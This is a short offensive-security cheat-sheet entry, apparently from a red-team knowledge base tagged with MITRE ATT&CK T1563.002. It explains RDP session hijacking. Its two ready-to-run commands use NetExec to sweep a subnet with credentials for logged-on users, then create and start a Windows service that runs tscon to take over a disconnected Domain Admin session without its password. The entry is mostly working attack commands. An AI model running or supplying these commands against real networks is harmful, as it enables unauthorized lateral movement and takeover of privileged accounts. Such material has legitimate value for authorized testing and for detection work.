---
id: rdp-hijack-tscon
title: RDP session hijack (tscon as SYSTEM)
section: Lateral movement & remote execution
phase: Lateral Movement
attack:
  tactic: TA0008
  techniques: [T1563.002]
platform: [windows, network]
source: hacktheplanet §"Lateral movement & remote execution"
pair: rdp-hijack-4688
---

A SYSTEM-level service can `tscon` into any *disconnected* RDP session without the
password — take over a logged-on Domain Admin's desktop outright. Find a target
session with `quser`, then create the service. `<session-id>` and `<n>` come from
`quser`, not the engagement env, so they stay literal.

```sh
nxc smb {{rhost}}/24 -u {{user}} -p {{password}} -x quser
sc create hijack binpath= "cmd /k tscon <session-id> /dest:rdp-tcp#<n>" && net start hijack
```
